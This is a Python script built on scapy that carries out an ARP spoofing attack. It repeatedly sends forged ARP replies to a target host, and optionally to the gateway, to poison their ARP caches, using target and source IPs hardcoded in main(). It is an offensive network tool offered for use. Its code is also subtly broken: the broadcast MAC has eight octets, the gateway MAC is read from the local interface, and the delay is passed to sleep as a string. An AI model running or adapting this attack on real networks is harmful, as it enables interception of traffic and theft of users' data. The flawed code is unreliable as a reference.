import sys
import subprocess
from scapy.all import ARP, Ether, sendp,srp
from time import sleep
help_msg = """
usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET

Spoof ARP tables

optional arguments:
    -h, --help show this help message and exit
    -i IFACE, --iface IFACE Interface you wish to use
    -s SRC, --src SRC The address you want for the attacker
    -d DELAY, --delay DELAY Delay (in seconds) between messages
    -gw should GW be attacked as well
    -t TARGET, --target TARGET IP of target
"""
broadcast_mac = "FF:FF:FF:FF:FF:FF:FF:FF"

ip_config = None
gw_ip = None
gw_mac = None
src_ip = None
src_iface = None

should_attack_gateway = False

dst_ip = None
dst_mac = None
delay = 0



def send_who_has():
    src_mac = get_mac_by_ip(src_ip)
    if not src_mac:
        print(f"Error, mac not found for {src_ip}")
        return
    
    pack = ARP(op=2,pdst=dst_ip,hwdst=dst_mac,psrc=src_ip,hwsrc=src_mac)
    sendp(pack)

    # Tell gw as well
    if should_attack_gateway:
        pack = ARP(op=2,pdst=gw_ip,hwdst=gw_mac,psrc=src_ip,hwsrc=src_mac)
        sendp(pack)

def get_mac_by_ip(ip):
    global broadcast_mac
    arp = ARP(op=1,pdst=ip)
    broadcast = Ether(dst=broadcast_mac)
    request_broadcast = broadcast / arp
    res, _ = srp(request_broadcast, timeout=1, verbose=False, iface=src_iface)
    return res[0][1].hwsrc if res else None


def init_state(args):
    global src_iface, src_ip,delay,should_attack_gateway,dst_ip,gw_ip,gw_mac
    while len(args) > 0:

        # IFACE Set
        if args[0] == '-i' or args[0] == '--iface' :
            # Run the ifconfig command, and search via Regex if interface exsits
            src_iface = args[1]
            if not src_iface:  
                print("You must specify the value of the new IFACE")
                exit()
            args = args[2:]
            continue
        
        # Src address
        if args[0] == '-s' or args[0] == '--src' :
            src_ip = args[1]
            if not src_ip:  
                print("You must specify the value of the new SRC address")
                exit()
            args = args[2:]
            continue

        # Delay parameter
        if args[0] == '-d' or args[0] == '--delay' :
            delay = args[1]
            if not delay:  
                print("You must specify the value of the delay")
                exit()

            args = args[2:]
            continue
        
        # Should attack gateway as well?
        if args[0] == '-gw' :
            should_attack_gateway = True
            args = args[1:]
            continue

        # Target ip
        if args[0] == '-t' or args[0] == '--target' :
            dst_ip = args[1]
            if not dst_ip:  
                print("You must specify the value of the TARGET")
                exit()

            args = args[2:]
            continue
    
    if not src_iface:
        ip_config = subprocess.run("ip route show default",shell=True, capture_output=True, text=True, check=True).stdout.split()
        src_iface = ip_config[4] # Default is the default

    try:
        gw_ip = subprocess.run(f"ip route show dev {src_iface} | grep default",shell=True, capture_output=True, text=True, check=True).stdout.split()[2]
        
        if not gw_ip:
            print("error")
            exit()

        gw_mac = subprocess.run(f"ip link show {src_iface} | grep link | sed 's/    //' ",shell=True, capture_output=True, text=True, check=True).stdout.split()[2]

        if not gw_mac:
            print("error")
            exit()

        if not src_ip:
            src_ip = gw_ip
    except Exception:
        print("error")
        exit()
    
    # Run the attack
    print (f"IFACE {src_iface}")
    print (f"SRC {src_ip}")
    print (f"Delay {delay}")
    print (f"GW {should_attack_gateway}")
    print (f"TARGET {dst_ip}")
    
def main():
    print(sys.argv)
    # if len(sys.argv) <= 1: exit()
    args = sys.argv
    args = args[1:]
    args = ['-i', 'eth0', '-t', '10.7.11.205', '-s', '10.7.15.254', '-d', '1']
    
    # Help
    if args[0] == '-h' or args[0] == '--help' :
        print(help_msg)
        exit()


    global ip_config,src_ip,src_iface
    ip_config = subprocess.run("ip route show default",shell=True, capture_output=True, text=True, check=True).stdout.split()
    src_ip = ip_config[2] # Default is gw of iface
    src_iface = ip_config[4] # Default is the default
    init_state(args)
    
    if dst_ip == None:
        print("Please specify the target value")
        exit()
    
    
    while True:
        send_who_has()
        sleep(delay)



main()